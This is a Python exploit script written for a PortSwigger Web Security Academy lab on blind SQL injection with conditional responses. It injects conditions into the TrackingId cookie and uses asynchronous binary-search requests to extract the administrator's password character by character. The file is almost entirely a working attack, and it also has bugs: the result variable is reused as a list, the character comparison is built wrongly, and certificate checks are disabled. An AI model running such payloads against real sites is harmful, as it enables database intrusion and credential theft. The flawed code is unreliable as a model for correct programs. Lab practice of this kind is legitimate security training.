""" 
MIT License

Copyright (c) 2024 [HackHuang]

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.

ADDITIONAL DISCLAIMER:
This software is intended for educational and security research purposes only.
Users are solely responsible for ensuring compliance with all applicable laws
and regulations. The author does not encourage or condone the use of this 
software for malicious purposes.
"""

# Author: HackHuang
# Description: For Lab: Blind SQL injection with conditional responses
# Lab Link: https://portswigger.net/web-security/sql-injection/blind/lab-conditional-responses
# Last Modified: 2024/12/19

import aiohttp
import asyncio
import tracemalloc
import time
from typing import *
from contextlib import contextmanager

LOWERCASE_CHAR_LIST: Final[Tuple[str, ...]] = ('a','b','c','d','e','f','g','h','i','j','k','l','m','n',
                                               'o','p','q','r','s','t','u','v','w','x','y','z')
UPPERCASE_CHAR_LIST: Final[Tuple[str, ...]] = ('A','B','C','D','E','F','G','H','I','J','K','L','M','N',
                                               'O','P','Q','R','S','T','U','V','W','X','Y','Z')
NUMBER_CHAR_LIST: Final[Tuple[str, ...]] = ('0','1','2','3','4','5','6','7','8','9')
# 1.Note that "\\" will output: "\"
# 2.Note that '—'(8212) is difference from '-'(45)
OTHERS_CHAR_LIST: Final[Tuple[str, ...]] = (' ', ',', '"', '#', '$', '%', '&', "'", '(', ')', '*', ',', '.', 
                                            '/', ';', '<', '=', '>', '@', '[', "\\", ']', '_', '`', '{', '|', '}', '©', '€', '—', '!', '-',)

# all_char_sorted_list: All char lists included, such as four lists as above
all_char_list: List[str] = list((*LOWERCASE_CHAR_LIST, *UPPERCASE_CHAR_LIST, *NUMBER_CHAR_LIST, *OTHERS_CHAR_LIST))
all_char_ascii_list: List[int] = [ord(char) for char in all_char_list]
all_char_ascii_sorted_list: List[int] = sorted(all_char_ascii_list)
all_char_sorted_list: List[str] = [chr(char_ascii) for char_ascii in all_char_ascii_sorted_list]

host: str = "0a47000e03b2303381f3bb36002500e2.web-security-academy.net"
url: str = f"https://{host}/login"
session: str = "session=A1SPWtF4zALjXrgZre5LzCCkzzLYSawg"
tracking_id: str = f"TrackingId=E7e0nTQ88qk5eWNg"

@contextmanager
def print_code_snippet_performance(operation: str) -> Generator[None, None, None]:
    tracemalloc.start()
    start_time = time.perf_counter()
    print(f'Starting {operation}')
    yield
    current_memory, peak_memory = tracemalloc.get_traced_memory()
    end_time = time.perf_counter()
    print(f'Memory usage:\t\t {current_memory / 10**6:.6f} MB \n'
          f'Peak memory usage:\t {peak_memory / 10**6:.6f} MB')
    print(f'Finished {operation} in {end_time - start_time:.6f} seconds\n')
    tracemalloc.stop()

async def get_method_async(url: str, headers: Dict[str, str], pattern: str) -> bool:
    # 服务器可能需要较长时间处理请求, 故设置超时时间为 60 * 10 秒
    timeout = aiohttp.ClientTimeout(total=60 * 10)
    # keepalive_timeout=0: 长时间使用同一个连接可能会导致服务器断开 Keep-Alive 连接, 故禁用 Keep-Alive
    # ssl=False: 如果你信任目标服务器，但其证书存在问题，可以通过禁用 SSL 验证来解决
    connector = aiohttp.TCPConnector(keepalive_timeout=0, ssl=False)
    # 服务器可能因为负载过高而断开连接, 故在每次请求之间等待 5 秒
    await asyncio.sleep(5)
    async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
        async with session.get(url=url, headers=headers) as response:
            content = await response.text()
            return pattern in content

async def binary_search_test_async(sql_1: str, sql_2: str, pattern: str) -> int:  
    low: int = 0
    high: int = len(all_char_ascii_sorted_list) - 1
    while low <= high:
        mid: int = (low + high) // 2
        char_ascii: int = all_char_ascii_sorted_list[mid]
        sql_injection_1: str = sql_1 + f'{char_ascii}'
        sql_injection_2: str = sql_2 + f'{char_ascii}'
        cookie_1 = tracking_id + sql_injection_1 + "; " + session
        cookie_2 = tracking_id + sql_injection_2 + "; " + session
        if await get_method_async(url=url, headers={"Host": host, "Cookie": cookie_1}, pattern=pattern):
            print(f'Get the char index successfully ---> {sql_injection_1}\n')
            return mid
        elif await get_method_async(url=url, headers={"Host": host, "Cookie": cookie_2}, pattern=pattern):
            low = mid + 1
        else:
            high = mid - 1
    return -1

async def get_data_with_binary_search_async(password_length: int, pattern: str) -> str:
    result: str = ''
    tasks: List = []
    count: int = 0
    substr_begin_index: int = 0
    while count < password_length:
        sql_injection_1: str = f"' and substr((select password from users where username='administrator'), {substr_begin_index + 1}, 1) = '"
        sql_injection_2: str = f"' and substr((select password from users where username='administrator'), {substr_begin_index + 1}, 1) > '"
        tasks.append(binary_search_test_async(sql_1=sql_injection_1, sql_2=sql_injection_2, pattern=pattern))
        count = count + 1
        substr_begin_index = substr_begin_index + 1
    result = await asyncio.gather(*tasks)
    for r in result:
        if r == -1:
            print(f'Not found the index of data char')
        else:
            data_char_ascii = all_char_ascii_sorted_list[r]
            result = result + chr(data_char_ascii)
    return result

async def main():
    result: str = await get_data_with_binary_search_async(password_length=20, pattern='Welcome back')
    print(f'Password is : {result}')

# 好吧, 尽力了, 看来 PortSwigger Lab 的访问还是很受限制的, 当我尝试使用异步 + 二分查找算法时, 
# 可能因短时间内, 请求过于频繁或请求次数过多，服务器抛出错误: aiohttp.client_exceptions.ServerDisconnectedError: Server disconnected...
with print_code_snippet_performance('get data with binary search and asyncio'):
    asyncio.run(main())